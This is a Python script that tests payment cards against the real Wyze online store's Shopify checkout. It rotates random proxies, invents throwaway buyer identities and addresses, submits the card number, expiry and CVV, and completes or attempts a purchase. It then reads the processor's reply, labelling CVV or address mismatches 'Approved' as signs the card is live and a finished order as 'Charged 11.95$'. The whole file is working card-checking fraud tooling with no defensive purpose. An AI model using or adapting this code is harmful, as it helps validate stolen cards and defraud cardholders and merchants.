import time
import random 
import string
from requests import Session
from retry_requests import retry
from srca.configs import rnd_prox

def QueryNotice(data):
        try: 
            start = data.index('notice__text">') + len('notice__text">')
            end   = data.index( '<' ,start)
            return       data [start:end]
        
        except: return 'Card was declined'


def wyze(cc, mes, ano, cvv):
    try:
        session = retry(Session(), retries=5, backoff_factor=0.2)
        
        session.proxies = rnd_prox()
        
        acii = string.ascii_letters + string.digits
        token = ''.join(random.choice(acii) for i in range(86))
        username = ''.join(random.choices('abcdefghijklmnñopqrstuvwxyz', k=10))
        mail = username + '@gmail.com'
            
        dataa = {'id': '41688247009442'}
        session.get(url='https://www.wyze.com/cart/add',params= dataa)
        
        req_1 = session.get(url='https://www.wyze.com/checkout')
        urlch = req_1.url

        data2 = f'_method=patch&authenticity_token={token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D={mail}&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D={username}&checkout%5Bshipping_address%5D%5Blast_name%5D={username}&checkout%5Bshipping_address%5D%5Baddress1%5D=street+234&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=NY&checkout%5Bshipping_address%5D%5Bcountry%5D=US&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10001&checkout%5Bshipping_address%5D%5Bphone%5D=3655476455&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D={username}&checkout%5Bshipping_address%5D%5Blast_name%5D={username}&checkout%5Bshipping_address%5D%5Baddress1%5D=street+234&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=NY&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10001&checkout%5Bshipping_address%5D%5Bphone%5D=3655476455&checkout%5Bclient_details%5D%5Bbrowser_width%5D=845&checkout%5Bclient_details%5D%5Bbrowser_height%5D=776&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'


        headers = {'Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'}
        session.post(urlch,data2,headers)

        data3 = f'_method=patch&authenticity_token={token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520Flat%2520Rate%2520Shipping%2520%285-7%2520business%2520days%29-5.99&checkout%5Bclient_details%5D%5Bbrowser_width%5D=862&checkout%5Bclient_details%5D%5Bbrowser_height%5D=776&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'
        session.post(urlch,data3,headers)

        data4= {"credit_card": {"number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}","name": username,"month": mes,"year": ano,"verification_value": cvv},"payment_session_scope": 'www.wyze.com'}
        req_2 =session.post(url= 'https://deposit.us.shopifycs.com/sessions', json=data4)
        id_west = req_2.json()['id']
        
        data5 = f'_method=patch&authenticity_token={token}&previous_step=payment_method&step=&s={id_west}&checkout%5Bpayment_gateway%5D=78981038242&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B13655476455&checkout%5Btotal_price%5D=1195&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=862&checkout%5Bclient_details%5D%5Bbrowser_height%5D=776&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'
        req_3 = session.post(urlch, data5)

        time.sleep(4)
        req_4 = session.get(str(req_3.url) + '?from_processing_page=1')
        req_5 = session.get(req_4.url)
        
        resultados = QueryNotice(req_5.text)
        
        if 'Security code was not matched by the processor' == resultados: return resultados,'Approved ✅'
        elif 'Security codes does not match correct format (3-4 digits)' == resultados: return resultados,'Approved ✅'
        elif 'Street address and postal code do not match' == resultados: return resultados,'Approved ✅'
        elif 'No Match' == resultados: return resultados,'Approved ✅'
        elif 'Charged' == resultados: return resultados,'Charged 11.95$ ✅'
        elif '/thank_you' in str(req_5.url) or '/orders/' in str(req_5.url) or '/post_purchase' in str(req_5.url): return  'Charged 11.95$','Approved ✅'
        elif '/3d_secure_2/' in str(req_5.url): return '3d_secure_2','DECLINED ❌'
        else: return resultados,'DECLINED ❌'
        
    except: return 'Card was declined','DECLINED ❌'

